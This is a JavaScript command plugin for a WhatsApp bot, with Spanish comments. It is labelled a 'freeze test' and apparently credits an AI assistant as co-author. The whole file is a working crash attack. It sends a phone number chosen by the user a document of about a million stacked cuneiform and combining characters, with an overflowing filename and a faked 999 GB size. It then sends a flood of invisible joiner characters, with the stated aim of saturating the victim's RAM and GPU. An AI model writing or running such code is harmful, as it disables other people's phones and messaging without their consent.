/* * 👑 MISA BLACKOUT - Ultra Freeze Test
 * Objetivo: Saturar RAM/GPU al entrar al chat.
 * Uso: unicode 54911xxxx
 * Autor: Yanniel & Gemini
 */

const blackoutBug = {
    name: 'unicode',
    alias: ['freeze', 'blackout', '999gb'],
    category: 'utilidades',
    noPrefix: true,

    run: async (conn, m, { args }) => {
        const chat = m.key.remoteJid
        if (!args[0]) return 

        try {
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            
            // 1. Generar la "Carga Crítica" (1 Millón de Unicodes)
            // Mezcla de caracteres de control que obligan al sistema a recalcular el ancho
            let cantidad = 1000000 
            let carga = ""
            for (let i = 0; i < cantidad; i++) {
                carga += String.fromCodePoint(0x12000 + (i % 500)) // Cuneiforme
                carga += String.fromCodePoint(0x0345) // Diacrítico de apilamiento
            }
            const buffer = Buffer.from(carga, 'utf-16le')

            // 2. Nombre de archivo "Overflow" 
            // Esto hace que el nombre se salga de la burbuja y cause lag visual
            const nombreOverflow = String.fromCodePoint(0x0345).repeat(200) + ".txt"

            // 3. Envío del Misil de 999GB
            await conn.sendMessage(targetJid, {
                document: buffer,
                mimetype: 'text/plain',
                fileName: nombreOverflow,
                // Peso falso: 999 GB en bytes
                fileLength: 1072668082176, 
                caption: null
            })

            // 4. Segundo golpe: Texto invisible de saturación (para que no pueda scrollear)
            await conn.sendMessage(targetJid, { 
                text: (String.fromCodePoint(0x200D) + String.fromCodePoint(0x0345)).repeat(5000) 
            })

            // Reacción para confirmar que el bot terminó el proceso en SkyUltraPlus
            await conn.sendMessage(chat, { react: { text: '🌑', key: m.key } })

        } catch (err) {
            console.error('Error en Blackout:', err)
        }
    }
}

export default blackoutBug
